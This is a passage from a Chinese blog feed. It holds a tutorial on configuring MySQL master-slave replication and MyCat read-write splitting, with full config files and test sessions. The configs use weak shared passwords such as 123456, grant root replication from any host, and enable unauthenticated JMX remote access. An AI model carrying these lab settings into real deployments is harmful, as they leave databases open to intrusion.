maxCon=&quot;1000&quot; minCon=&quot;10&quot; balance=&quot;1&quot;writeType=&quot;0&quot; dbType=&quot;mysql&quot; dbDriver=&quot;native&quot;&gt; &lt;heartbeat&gt;select user()&lt;/heartbeat&gt; &lt;!-- can have multi write hosts --&gt; &lt;writeHost host=&quot;192.168.10.13&quot; url=&quot;192.168.10.13:3306&quot; user=&quot;root&quot; password=&quot;123456&quot; /&gt; &lt;/dataHost&gt;&lt;dataHost name=&quot;jaking14&quot; maxCon=&quot;1000&quot; minCon=&quot;10&quot; balance=&quot;1&quot; writeType=&quot;0&quot; dbType=&quot;mysql&quot; dbDriver=&quot;native&quot;&gt; &lt;heartbeat&gt;select user()&lt;/heartbeat&gt; &lt;!-- can have multi write hosts --&gt; &lt;writeHost host=&quot;192.168.10.14&quot; url=&quot;192.168.10.14:3306&quot; user=&quot;root&quot; password=&quot;123456&quot; /&gt; &lt;/dataHost&gt; &lt;/mycat:schema&gt;</code></pre><p><code>server.xml</code></p><pre><code class="xml">&lt;!-- &#x5F00;&#x901A;root&#x7528;&#x6237;&#x8BBF;&#x95EE;mycatdb&#x8BBF;&#x95EE;&#x6743;&#x9650; mycatdbx&#x662F;&#x865A;&#x62DF;&#x7684;schema --&gt;&lt;user name=&quot;root&quot;&gt;     &lt;property name=&quot;password&quot;&gt;123456&lt;/property&gt;     &lt;property name=&quot;schemas&quot;&gt;mycatdb1,mycatdb2,mycatdb3,mycatdb4,mycatdb5,mycatdb6,mycatdb7,mycatdb8,mycatdb9&lt;/property&gt; &lt;/user&gt;&lt;!-- &#x5F00;&#x901A;user&#x666E;&#x901A;&#x7528;&#x6237;&#x8BBF;&#x95EE;mycatdb&#x8BBF;&#x95EE;&#x6743;&#x9650; mycatdbx&#x662F;&#x865A;&#x62DF;&#x7684;schema --&gt;&lt;user name=&quot;user&quot;&gt;     &lt;property name=&quot;password&quot;&gt;123456&lt;/property&gt;     &lt;property name=&quot;schemas&quot;&gt;mycatdb1,mycatdb2,mycatdb3,mycatdb4,mycatdb5,mycatdb6,mycatdb7,mycatdb8,mycatdb9&lt;/property&gt;     &lt;property name=&quot;readOnly&quot;&gt;true&lt;/property&gt; &lt;/user&gt;</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;code&gt;schema.xml&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;xml&quot;&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot;?&amp;gt;
&amp;lt;!DOCTYPE mycat:schema SYSTEM &amp;quot;schema.dt
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>MySQL数据库高级应用之读写分离</title>
    <link href="https://marnm.github.io//posts/490925f2/"/>
    <id>https://marnm.github.io//posts/490925f2/</id>
    <published>2022-06-07T04:46:08.000Z</published>
    <updated>2022-06-07T05:11:31.158Z</updated>
    
    <content type="html"><![CDATA[<h1 id="MySQL&#x6570;&#x636E;&#x5E93;&#x9AD8;&#x7EA7;&#x5E94;&#x7528;&#x4E4B;&#x8BFB;&#x5199;&#x5206;&#x79BB;&#x2014;&#x2014;MyCat&#x7BC7;"><a href="#MySQL&#x6570;&#x636E;&#x5E93;&#x9AD8;&#x7EA7;&#x5E94;&#x7528;&#x4E4B;&#x8BFB;&#x5199;&#x5206;&#x79BB;&#x2014;&#x2014;MyCat&#x7BC7;" class="headerlink" title="MySQL&#x6570;&#x636E;&#x5E93;&#x9AD8;&#x7EA7;&#x5E94;&#x7528;&#x4E4B;&#x8BFB;&#x5199;&#x5206;&#x79BB;&#x2014;&#x2014;MyCat&#x7BC7;"></a>MySQL&#x6570;&#x636E;&#x5E93;&#x9AD8;&#x7EA7;&#x5E94;&#x7528;&#x4E4B;&#x8BFB;&#x5199;&#x5206;&#x79BB;&#x2014;&#x2014;MyCat&#x7BC7;</h1><h2 id="&#x914D;&#x7F6E;MySQL&#x4E3B;&#x4ECE;"><a href="#&#x914D;&#x7F6E;MySQL&#x4E3B;&#x4ECE;" class="headerlink" title="&#x914D;&#x7F6E;MySQL&#x4E3B;&#x4ECE;"></a>&#x914D;&#x7F6E;MySQL&#x4E3B;&#x4ECE;</h2><h3 id="Master"><a href="#Master" class="headerlink" title="Master"></a>Master</h3><p>&#x4FEE;&#x6539;&#x914D;&#x7F6E;</p><pre><code class="ini">symbolic-links=0log-error=/var/log/mysqld.logpid-file=/var/run/mysqld/mysqld.pidbind-address    = 0.0.0.0user=mysqlinnodb_flush_log_at_trx_commit=1sync_binlog=1log-bin=mysql-bin-masterserver-id=1binlog-do-db=habinlog-ignore-db=mysqllower_case_table_names=1skip-name-resolvecharacter-set-server=utf8collation-server=utf8_general_ci</code></pre><p>&#x521B;&#x5EFA;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x5E76;&#x8BBE;&#x7F6E;&#x6388;&#x6743;&#x7528;&#x6237;</p><pre><code class="sql">CREATE DATABASE ha;use haCREATE TABLE test(id int, name char(16));grant replication slave on *.* to root@&apos;%&apos; identified by &apos;123456&apos;;flush privileges;show master status;</code></pre><p>&#x5BFC;&#x51FA;&#x6570;&#x636E;&#x5E93;</p><pre><code class="shell">mysqldump -uroot -p -B ha &gt; ha.sql</code></pre><h3 id="Slave"><a href="#Slave" class="headerlink" title="Slave"></a>Slave</h3><p>&#x4FEE;&#x6539;&#x914D;&#x7F6E;&#x6587;&#x4EF6;</p><pre><code class="ini">symbolic-links=0log-error=/var/log/mysqld.logpid-file=/var/run/mysqld/mysqld.pidbind-address    = 0.0.0.0log-bin=mysql-binserver-id=3binlog-do-db=habinlog-ignore-db=mysqllog_slave_updates=1skip-name-resolvelower_case_table_names=1character-set-server=utf8collation-server=utf8_general_ci</code></pre><p>&#x8BBE;&#x7F6E;&#x4E3B;&#x670D;&#x52A1;</p><pre><code class="sql">change master to master_host=&apos;master_ip_addr&apos;, master_user=&apos;root&apos;, master_password=&apos;123456&apos;, master_log_file=&apos;master_db_bin&apos;;flush privileges;start slave;</code></pre><p>&#x5BFC;&#x5165;Master&#x7684;&#x6570;&#x636E;&#x5E93;</p><pre><code class="shell">mysql -uroot -p &lt; ha.sql</code></pre><h2 id="&#x5B89;&#x88C5;&#x914D;&#x7F6E;MyCat"><a href="#&#x5B89;&#x88C5;&#x914D;&#x7F6E;MyCat" class="headerlink" title="&#x5B89;&#x88C5;&#x914D;&#x7F6E;MyCat"></a>&#x5B89;&#x88C5;&#x914D;&#x7F6E;MyCat</h2><h3 id="&#x5B89;&#x88C5;jdk&#xFF0C;&#x914D;&#x7F6E;Java&#x73AF;&#x5883;&#x53D8;&#x91CF;"><a href="#&#x5B89;&#x88C5;jdk&#xFF0C;&#x914D;&#x7F6E;Java&#x73AF;&#x5883;&#x53D8;&#x91CF;" class="headerlink" title="&#x5B89;&#x88C5;jdk&#xFF0C;&#x914D;&#x7F6E;Java&#x73AF;&#x5883;&#x53D8;&#x91CF;"></a>&#x5B89;&#x88C5;jdk&#xFF0C;&#x914D;&#x7F6E;Java&#x73AF;&#x5883;&#x53D8;&#x91CF;</h3><pre><code class="shell">mkdir /usr/javatar -zxvf jdk-8u201-linux-x64.tar.gz -C /usr/java/</code></pre><pre><code class="shell">vim /etc/profileJAVA_HOME=/usr/java/jdk1.8.0_201PATH=$JAVA_HOME/bin:$PATHCLASSPATH=$JAVA_HOME/jre/lib/ext:$JAVA_HOME/lib/tools.jarexport PATH JAVA_HOME CLASSPATHMYCAT_HOME=/usr/local/mycatPATH=$MYCAT_HOME/bin:$PATHsource /etc/profile</code></pre><h3 id="&#x5B89;&#x88C5;MyCat"><a href="#&#x5B89;&#x88C5;MyCat" class="headerlink" title="&#x5B89;&#x88C5;MyCat"></a>&#x5B89;&#x88C5;MyCat</h3><pre><code class="shell">tar -zxvf Mycat-server-1.6.7.3-release-20190927161129-linux.tar.gz -C /usr/local/</code></pre><p><strong>&#x4FEE;&#x6539;wrapper.conf&#x914D;&#x7F6E;&#x6587;&#x4EF6;</strong></p><pre><code class="ini">#********************************************************************# Wrapper Properties#********************************************************************# Java Application# &#x6539;&#x6210;JDK&#x5B89;&#x88C5;&#x76EE;&#x5F55;wrapper.java.command=/usr/java/jdk1.8.0_201/bin/javawrapper.working.dir=..# Java Main class.  This class must implement the WrapperListener interface#  or guarantee that the WrapperManager class is initialized.  Helper#  classes are provided to do this for you.  See the Integration section#  of the documentation for details.wrapper.java.mainclass=org.tanukisoftware.wrapper.WrapperSimpleAppset.default.REPO_DIR=libset.APP_BASE=.# Java Classpath (include wrapper.jar)  Add class path elements as#  needed starting from 1wrapper.java.classpath.1=lib/wrapper.jarwrapper.java.classpath.2=confwrapper.java.classpath.3=%REPO_DIR%/*# Java Library Path (location of Wrapper.DLL or libwrapper.so)wrapper.java.library.path.1=lib# Java Additional Parameters#wrapper.java.additional.1=wrapper.java.additional.1=-DMYCAT_HOME=.wrapper.java.additional.2=-serverwrapper.java.additional.3=-XX:MaxPermSize=64Mwrapper.java.additional.4=-XX:+AggressiveOptswrapper.java.additional.5=-XX:MaxDirectMemorySize=2Gwrapper.java.additional.6=-Dcom.sun.management.jmxremotewrapper.java.additional.7=-Dcom.sun.management.jmxremote.port=1984wrapper.java.additional.8=-Dcom.sun.management.jmxremote.authenticate=falsewrapper.java.additional.9=-Dcom.sun.management.jmxremote.ssl=false# &#x5982;&#x679C;MyCat&#x8FD8;&#x662F;&#x8D77;&#x4E0D;&#x6765;&#x8C03;&#x6574;&#x4E00;&#x4E0B;&#x6027;&#x80FD;&#x8981;&#x6C42;wrapper.java.additional.10=-Xmx640Mwrapper.java.additional.11=-Xms256M# Initial Java Heap Size (in MB)#wrapper.java.initmemory=3# Maximum Java Heap Size (in MB)#wrapper.java.maxmemory=64# Application parameters.  Add parameters as needed starting from 1wrapper.app.parameter.1=io.mycat.MycatStartupwrapper.app.parameter.2=start#********************************************************************# Wrapper Logging Properties#********************************************************************# Format of output for the console.  (See docs for formats)wrapper.console.format=PM# Log Level for console output.  (See docs for log levels)wrapper.console.loglevel=INFO# Log file to use for wrapper output logging.wrapper.logfile=logs/wrapper.log# Format of output for the log file.  (See docs for formats)wrapper.logfile.format=LPTM# Log Level for log file output.  (See docs for log levels)wrapper.logfile.loglevel=INFO# Maximum size that the log file will be allowed to grow to before#  the log is rolled. Size is specified in bytes.  The default value#  of 0, disables log rolling.  May abbreviate with the &apos;k&apos; (kb) or#  &apos;m&apos; (mb) suffix.  For example: 10m = 10 megabytes.wrapper.logfile.maxsize=512m# Maximum number of rolled log files which will be allowed before old#  files are deleted.  The default value of 0 implies no limit.wrapper.logfile.maxfiles=30# Log Level for sys/event log output.  (See docs for log levels)wrapper.syslog.loglevel=NONE#********************************************************************# Wrapper Windows Properties#********************************************************************# Title to use when running as a consolewrapper.console.title=Mycat-server#********************************************************************# Wrapper Windows NT/2000/XP Service Properties#********************************************************************# WARNING - Do not modify any of these properties when an application#  using this configuration file has been installed as a service.#  Please uninstall the service before modifying this section.  The#  service can then be reinstalled.# Name of the servicewrapper.ntservice.name=mycat# Display name of the servicewrapper.ntservice.displayname=Mycat-server# Description of the servicewrapper.ntservice.description=The project of Mycat-server# Service dependencies.  Add dependencies as needed starting from 1wrapper.ntservice.dependency.1=# Mode in which the service is installed.  AUTO_START or DEMAND_STARTwrapper.ntservice.starttype=AUTO_START# Allow the service to interact with the desktop.wrapper.ntservice.interactive=falsewrapper.ping.timeout=120configuration.directory.in.classpath.first=conf</code></pre><p><strong>&#x4FEE;&#x6539;server.xml</strong></p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!-- - - Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);        - you may not use this file except in compliance with the License. - You        may obtain a copy of the License at - - http://www.apache.org/licenses/LICENSE-2.0        - - Unless required by applicable law or agreed to in writing, software -        distributed under the License is distributed on an &quot;AS IS&quot; BASIS, - WITHOUT        WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. - See the        License for the specific language governing permissions and - limitations        under the License. --&gt;&lt;!DOCTYPE mycat:server SYSTEM &quot;server.dtd&quot;&gt;&lt;mycat:server xmlns:mycat=&quot;http://io.mycat/&quot;&gt;        &lt;system&gt;        &lt;property name=&quot;nonePasswordLogin&quot;&gt;0&lt;/property&gt; &lt;!-- 0&#x4E3A;&#x9700;&#x8981;&#x5BC6;&#x7801;&#x767B;&#x9646;&#x3001;1&#x4E3A;&#x4E0D;&#x9700;&#x8981;&#x5BC6;&#x7801;&#x767B;&#x9646; ,&#x9ED8;&#x8BA4;&#x4E3A;0&#xFF0C;&#x8BBE;&#x7F6E;&#x4E3A;1&#x5219;&#x9700;&#x8981;&#x6307;&#x5B9A;&#x9ED8;&#x8BA4;&#x8D26;&#x6237;--&gt;        &lt;property name=&quot;useHandshakeV10&quot;&gt;1&lt;/property&gt;        &lt;property name=&quot;useSqlStat&quot;&gt;0&lt;/property&gt;  &lt;!-- 1&#x4E3A;&#x5F00;&#x542F;&#x5B9E;&#x65F6;&#x7EDF;&#x8BA1;&#x3001;0&#x4E3A;&#x5173;&#x95ED; --&gt;        &lt;property name=&quot;useGlobleTableCheck&quot;&gt;0&lt;/property&gt;  &lt;!-- 1&#x4E3A;&#x5F00;&#x542F;&#x5168;&#x52A0;&#x73ED;&#x4E00;&#x81F4;&#x6027;&#x68C0;&#x6D4B;&#x3001;0&#x4E3A; &#x5173;&#x95ED; --&gt;                &lt;property name=&quot;sqlExecuteTimeout&quot;&gt;300&lt;/property&gt;  &lt;!-- SQL &#x6267;&#x884C;&#x8D85;&#x65F6; &#x5355;&#x4F4D;:&#x79D2;--&gt;                &lt;property name=&quot;sequnceHandlerType&quot;&gt;2&lt;/property&gt;                &lt;!--&lt;property name=&quot;sequnceHandlerPattern&quot;&gt;(?:(\s*next\s+value\s+for\s*MYCATSEQ_(\w+))(,|\)|\s)*)+&lt;/property&gt;--&gt;                &lt;!--&#x5FC5;&#x987B;&#x5E26;&#x6709;MYCATSEQ_&#x6216;&#x8005; mycatseq_&#x8FDB;&#x5165;&#x5E8F;&#x5217;&#x5339;&#x914D;&#x6D41;&#x7A0B; &#x6CE8;&#x610F;MYCATSEQ_&#x6709;&#x7A7A;&#x683C;&#x7684;&#x60C5;&#x51B5;--&gt;                &lt;property name=&quot;sequnceHandlerPattern&quot;&gt;(?:(\s*next\s+value\s+for\s*MYCATSEQ_(\w+))(,|\)|\s)*)+&lt;/property&gt;        &lt;property name=&quot;subqueryRelationshipCheck&quot;&gt;false&lt;/property&gt; &lt;!-- &#x5B50;&#x67E5;&#x8BE2;&#x4E2D;&#x5B58;&#x5728;&#x5173;&#x8054;&#x67E5;&#x8BE2;&#x7684;&#x60C5;&#x51B5;&#x4E0B;,&#x68C0;&#x67E5;&#x5173;&#x8054;&#x5B57;&#x6BB5;&#x4E2D;&#x662F;&#x5426;&#x6709;&#x5206;&#x7247;&#x5B57;&#x6BB5; .&#x9ED8;&#x8BA4; false --&gt;      &lt;!--  &lt;property name=&quot;useCompression&quot;&gt;1&lt;/property&gt;--&gt; &lt;!--1&#x4E3A;&#x5F00;&#x542F;mysql&#x538B;&#x7F29;&#x534F;&#x8BAE;--&gt;        &lt;!--  &lt;property name=&quot;fakeMySQLVersion&quot;&gt;5.6.20&lt;/property&gt;--&gt; &lt;!--&#x8BBE;&#x7F6E;&#x6A21;&#x62DF;&#x7684;MySQL&#x7248;&#x672C; &#x53F7;--&gt;        &lt;!-- &lt;property name=&quot;processorBufferChunk&quot;&gt;40960&lt;/property&gt; --&gt;        &lt;!--        &lt;property name=&quot;processors&quot;&gt;1&lt;/property&gt;        &lt;property name=&quot;processorExecutor&quot;&gt;32&lt;/property&gt;         --&gt;        &lt;!--&#x9ED8;&#x8BA4;&#x4E3A;type 0: DirectByteBufferPool | type 1 ByteBufferArena | type 2 NettyBufferPool --&gt;                &lt;property name=&quot;processorBufferPoolType&quot;&gt;0&lt;/property&gt;                &lt;!--&#x9ED8;&#x8BA4;&#x662F;65535 64K &#x7528;&#x4E8E;sql&#x89E3;&#x6790;&#x65F6;&#x6700;&#x5927;&#x6587;&#x672C;&#x957F;&#x5EA6; --&gt;                &lt;!--&lt;property name=&quot;maxStringLiteralLength&quot;&gt;65535&lt;/property&gt;--&gt;                &lt;!--&lt;property name=&quot;sequnceHandlerType&quot;&gt;0&lt;/property&gt;--&gt;                &lt;!--&lt;property name=&quot;backSocketNoDelay&quot;&gt;1&lt;/property&gt;--&gt;                &lt;!--&lt;property name=&quot;frontSocketNoDelay&quot;&gt;1&lt;/property&gt;--&gt;                &lt;!--&lt;property name=&quot;processorExecutor&quot;&gt;16&lt;/property&gt;--&gt;                &lt;!--                        &lt;property name=&quot;serverPort&quot;&gt;8066&lt;/property&gt; &lt;property name=&quot;managerPort&quot;&gt;9066&lt;/property&gt;                        &lt;property name=&quot;idleTimeout&quot;&gt;300000&lt;/property&gt; &lt;property name=&quot;bindIp&quot;&gt;0.0.0.0&lt;/property&gt;                        &lt;property name=&quot;dataNodeIdleCheckPeriod&quot;&gt;300000&lt;/property&gt; 5 * 60 * 1000L; //&#x8FDE;&#x63A5;&#x7A7A;&#x95F2;&#x68C0;&#x67E5;                        &lt;property name=&quot;frontWriteQueueSize&quot;&gt;4096&lt;/property&gt; &lt;property name=&quot;processors&quot;&gt;32&lt;/property&gt; --&gt;                &lt;!--&#x5206;&#x5E03;&#x5F0F;&#x4E8B;&#x52A1;&#x5F00;&#x5173;&#xFF0C;0&#x4E3A;&#x4E0D;&#x8FC7;&#x6EE4;&#x5206;&#x5E03;&#x5F0F;&#x4E8B;&#x52A1;&#xFF0C;1&#x4E3A;&#x8FC7;&#x6EE4;&#x5206;&#x5E03;&#x5F0F;&#x4E8B;&#x52A1;&#xFF08;&#x5982;&#x679C;&#x5206;&#x5E03;&#x5F0F;&#x4E8B;&#x52A1;&#x5185; &#x53EA;&#x6D89;&#x53CA;&#x5168;&#x5C40;&#x8868;&#xFF0C;&#x5219;&#x4E0D;&#x8FC7;&#x6EE4;&#xFF09;&#xFF0C;2&#x4E3A;&#x4E0D;&#x8FC7;&#x6EE4;&#x5206;&#x5E03;&#x5F0F;&#x4E8B;&#x52A1;,&#x4F46;&#x662F;&#x8BB0;&#x5F55;&#x5206;&#x5E03;&#x5F0F;&#x4E8B;&#x52A1;&#x65E5;&#x5FD7;--&gt;                &lt;property name=&quot;handleDistributedTransactions&quot;&gt;0&lt;/property&gt;                        &lt;!--                        off heap for merge/order/group/limit      1&#x5F00;&#x542F;   0&#x5173;&#x95ED;                --&gt;                &lt;property name=&quot;useOffHeapForMerge&quot;&gt;0&lt;/property&gt;                &lt;!--                        &#x5355;&#x4F4D;&#x4E3A;m                --&gt;        &lt;property name=&quot;memoryPageSize&quot;&gt;64k&lt;/property&gt;                &lt;!--                        &#x5355;&#x4F4D;&#x4E3A;k                --&gt;                &lt;property name=&quot;spillsFileBufferSize&quot;&gt;1k&lt;/property&gt;                &lt;property name=&quot;useStreamOutput&quot;&gt;0&lt;/property&gt;                &lt;!--                        &#x5355;&#x4F4D;&#x4E3A;m                --&gt;                &lt;property name=&quot;systemReserveMemorySize&quot;&gt;384m&lt;/property&gt;                &lt;!--&#x662F;&#x5426;&#x91C7;&#x7528;zookeeper&#x534F;&#x8C03;&#x5207;&#x6362;  --&gt;                &lt;property name=&quot;useZKSwitch&quot;&gt;false&lt;/property&gt;                &lt;!-- XA Recovery Log&#x65E5;&#x5FD7;&#x8DEF;&#x5F84; --&gt;                &lt;!--&lt;property name=&quot;XARecoveryLogBaseDir&quot;&gt;./&lt;/property&gt;--&gt;                &lt;!-- XA Recovery Log&#x65E5;&#x5FD7;&#x540D;&#x79F0; --&gt;                &lt;!--&lt;property name=&quot;XARecoveryLogBaseName&quot;&gt;tmlog&lt;/property&gt;--&gt;                &lt;!--&#x5982;&#x679C;&#x4E3A; true&#x7684;&#x8BDD; &#x4E25;&#x683C;&#x9075;&#x5B88;&#x9694;&#x79BB;&#x7EA7;&#x522B;,&#x4E0D;&#x4F1A;&#x5728;&#x4EC5;&#x4EC5;&#x53EA;&#x6709;select&#x8BED;&#x53E5;&#x7684;&#x65F6;&#x5019;&#x5728;&#x4E8B;&#x52A1;&#x4E2D;&#x5207;&#x6362;&#x8FDE;&#x63A5;--&gt;                &lt;property name=&quot;strictTxIsolation&quot;&gt;false&lt;/property&gt;                &lt;property name=&quot;useZKSwitch&quot;&gt;true&lt;/property&gt;        &lt;/system&gt;        &lt;!-- &#x5168;&#x5C40;SQL&#x9632;&#x706B;&#x5899;&#x8BBE;&#x7F6E; --&gt;        &lt;!--&#x767D;&#x540D;&#x5355;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x901A;&#x914D;&#x7B26;%&#x6216;&#x7740;*--&gt;        &lt;!--&#x4F8B;&#x5982;&lt;host host=&quot;127.0.0.*&quot; user=&quot;root&quot;/&gt;--&gt;        &lt;!--&#x4F8B;&#x5982;&lt;host host=&quot;127.0.*&quot; user=&quot;root&quot;/&gt;--&gt;        &lt;!--&#x4F8B;&#x5982;&lt;host host=&quot;127.*&quot; user=&quot;root&quot;/&gt;--&gt;        &lt;!--&#x4F8B;&#x5982;&lt;host host=&quot;1*7.*&quot; user=&quot;root&quot;/&gt;--&gt;        &lt;!--&#x8FD9;&#x4E9B;&#x914D;&#x7F6E;&#x60C5;&#x51B5;&#x4E0B;&#x5BF9;&#x4E8E;127.0.0.1&#x90FD;&#x80FD;&#x4EE5;root&#x8D26;&#x6237;&#x767B;&#x5F55;--&gt;        &lt;!--        &lt;firewall&gt;           &lt;whitehost&gt;              &lt;host host=&quot;1*7.0.0.*&quot; user=&quot;root&quot;/&gt;           &lt;/whitehost&gt;       &lt;blacklist check=&quot;false&quot;&gt;       &lt;/blacklist&gt;        &lt;/firewall&gt;        --&gt;        &lt;!-- fnaichu:&#x4FEE;&#x6539;&#x76F8;&#x5173;&#x6570;&#x636E;&#x5E93;&#x914D;&#x7F6E;&#xFF1A; --&gt;        &lt;user name=&quot;root&quot; defaultAccount=&quot;true&quot;&gt;                &lt;property name=&quot;password&quot;&gt;ccc.456&lt;/property&gt;                &lt;property name=&quot;schemas&quot;&gt;ha&lt;/property&gt;                &lt;!-- &#x8868;&#x7EA7; DML &#x6743;&#x9650;&#x8BBE;&#x7F6E; --&gt;                &lt;!--                &lt;privileges check=&quot;false&quot;&gt;                        &lt;schema name=&quot;TESTDB&quot; dml=&quot;0110&quot; &gt;                                &lt;table name=&quot;tb01&quot; dml=&quot;0000&quot;&gt;&lt;/table&gt;                                &lt;table name=&quot;tb02&quot; dml=&quot;1111&quot;&gt;&lt;/table&gt;                        &lt;/schema&gt;                &lt;/privileges&gt;                 --&gt;        &lt;/user&gt;        &lt;!-- fnaichu:&#x4FEE;&#x6539;&#x8FD9;&#x91CC; --&gt;        &lt;user name=&quot;user&quot;&gt;                &lt;property name=&quot;password&quot;&gt;user&lt;/property&gt;                &lt;property name=&quot;schemas&quot;&gt;ha&lt;/property&gt;                &lt;property name=&quot;readOnly&quot;&gt;true&lt;/property&gt;        &lt;/user&gt;&lt;/mycat:server&gt;</code></pre><p><strong>&#x4FEE;&#x6539;schema.xml</strong></p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE mycat:schema SYSTEM &quot;schema.dtd&quot;&gt;&lt;mycat:schema xmlns:mycat=&quot;http://io.mycat/&quot;&gt;&lt;schema name=&quot;ha&quot; checkSQLschema=&quot;false&quot; sqlMaxLimit=&quot;100&quot; dataNode=&apos;dn1&apos;&gt;        &lt;/schema&gt;        &lt;dataNode name=&quot;dn1&quot; dataHost=&quot;dthost&quot; database=&quot;ha&quot;/&gt;        &lt;dataHost name=&quot;dthost&quot; maxCon=&quot;500&quot; minCon=&quot;10&quot; balance=&quot;3&quot; writeType=&quot;0&quot; dbType=&quot;mysql&quot; dbDriver=&quot;native&quot; switchType=&quot;1&quot; slaveThreshold=&quot;100&quot;&gt;        &lt;heartbeat&gt;select user()&lt;/heartbeat&gt;        &lt;writeHost host=&quot;rhel7&quot; url=&quot;192.168.73.21:3306&quot; user=&quot;root&quot; password=&quot;ccc.456&quot;&gt;        &lt;readHost host=&quot;rhel_sqlsrv&quot; url=&quot;192.168.73.22:3306&quot; user=&quot;root&quot; password=&quot;ccc.456&quot; /&gt;        &lt;/writeHost&gt;        &lt;/dataHost&gt;&lt;/mycat:schema&gt;</code></pre><p><strong>&#x4FEE;&#x6539;log4j2.xml&#x6587;&#x4EF6;</strong></p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;Configuration status=&quot;WARN&quot;&gt;    &lt;Appenders&gt;        &lt;Console name=&quot;Console&quot; target=&quot;SYSTEM_OUT&quot;&gt;            &lt;PatternLayout pattern=&quot;%d [%-5p][%t] %m %throwable{full} (%C:%F:%L) %n&quot;/&gt;        &lt;/Console&gt;        &lt;RollingFile name=&quot;RollingFile&quot; fileName=&quot;${sys:MYCAT_HOME}/logs/mycat.log&quot;                     filePattern=&quot;${sys:MYCAT_HOME}/logs/$${date:yyyy-MM}/mycat-%d{MM-dd}-%i.log.gz&quot;&gt;        &lt;PatternLayout&gt;                &lt;Pattern&gt;%d{yyyy-MM-dd HH:mm:ss.SSS} %5p [%t] (%l) - %m%n&lt;/Pattern&gt;            &lt;/PatternLayout&gt;            &lt;Policies&gt;                &lt;OnStartupTriggeringPolicy/&gt;                &lt;SizeBasedTriggeringPolicy size=&quot;250 MB&quot;/&gt;                &lt;TimeBasedTriggeringPolicy/&gt;            &lt;/Policies&gt;        &lt;/RollingFile&gt;    &lt;/Appenders&gt;    &lt;Loggers&gt;        &lt;!--&lt;AsyncLogger name=&quot;io.mycat&quot; level=&quot;info&quot; includeLocation=&quot;true&quot; additivity=&quot;false&quot;&gt;--&gt;            &lt;!--&lt;AppenderRef ref=&quot;Console&quot;/&gt;--&gt;            &lt;!--&lt;AppenderRef ref=&quot;RollingFile&quot;/&gt;--&gt;        &lt;!--&lt;/AsyncLogger&gt;--&gt;        &lt;!-- fnaichu:&#x8C03;&#x6574;&#x65E5;&#x5FD7;&#x7EA7;&#x522B; --&gt;        &lt;asyncRoot level=&quot;debug&quot; includeLocation=&quot;true&quot;&gt;            &lt;!--&lt;AppenderRef ref=&quot;Console&quot; /&gt;--&gt;            &lt;AppenderRef ref=&quot;RollingFile&quot;/&gt;        &lt;/asyncRoot&gt;    &lt;/Loggers&gt;&lt;/Configuration&gt;</code></pre><h2 id="&#x6D4B;&#x8BD5;&#x8BFB;&#x5199;&#x5206;&#x79BB;"><a href="#&#x6D4B;&#x8BD5;&#x8BFB;&#x5199;&#x5206;&#x79BB;" class="headerlink" title="&#x6D4B;&#x8BD5;&#x8BFB;&#x5199;&#x5206;&#x79BB;"></a>&#x6D4B;&#x8BD5;&#x8BFB;&#x5199;&#x5206;&#x79BB;</h2><p>&#x76EE;&#x524D;MyCAT&#x6709;&#x4E24;&#x4E2A;&#x7AEF;&#x53E3;&#xFF0C;8066&#x6570;&#x636E;&#x7AEF;&#x53E3;&#xFF0C;9066&#x7BA1;&#x7406;&#x7AEF;&#x53E3;&#xFF0C;&#x6D4B;&#x8BD5;&#x8BFB;&#x5199;&#x64CD;&#x4F5C;&#x7528;8066&#x6570;&#x636E;&#x7AEF;&#x53E3;</p><pre><code class="shell">[root@ctos7mini ~]&amp; netstat -pantul | grep 66tcp6       0      0 :::46667                :::*                    LISTEN      4136/javatcp6       0      0 :::8066                 :::*                    LISTEN      4136/javatcp6       0      0 :::9066                 :::*                    LISTEN      4136/java[root@ctos7mini ~]#</code></pre><pre><code class="sql">[root@ctos7mini ~]# mysql -uroot -pccc.456 -h192.168.73.20 -P8066mysql: [Warning] Using a password on the command line interface can be insecure.Welcome to the MySQL monitor.  Commands end with ; or \g.Your MySQL connection id is 5Server version: 5.6.29-mycat-1.6.7.3-release-20190927161129 MyCat Server (OpenCloudDB)Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type &apos;help;&apos; or &apos;\h&apos; for help. Type &apos;\c&apos; to clear the current input statement.mysql&gt; show databases;+----------+| DATABASE |+----------+| ha       |+----------+1 row in set (0.00 sec)mysql&gt;[root@ctos7mini ~]# mysql -uroot -pccc.456 -h192.168.73.20 -P9066mysql: [Warning] Using a password on the command line interface can be insecure.Welcome to the MySQL monitor.  Commands end with ; or \g.Your MySQL connection id is 4Server version: 5.6.29-mycat-1.6.7.3-release-20190927161129 MyCat Server (monitor)Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type &apos;help;&apos; or &apos;\h&apos; for help. Type &apos;\c&apos; to clear the current input statement.mysql&gt; show databases;+----------+| DATABASE |+----------+| ha       |+----------+1 row in set (0.00 sec)mysql&gt;</code></pre><p><strong>&#x89C2;&#x5BDF;&#x65E5;&#x5FD7;&#x53D8;&#x5316;</strong></p><pre><code class="shell">tail -f /usr/local/mycat/logs/mycat.log</code></pre><pre><code>2022-05-08 01:19:04.198 DEBUG [$_NIOREACTOR-0-RW] (io.mycat.server.NonBlockingSession.releaseConnection(NonBlockingSession.java:386)) - release connection MySQLConnection [id=11, 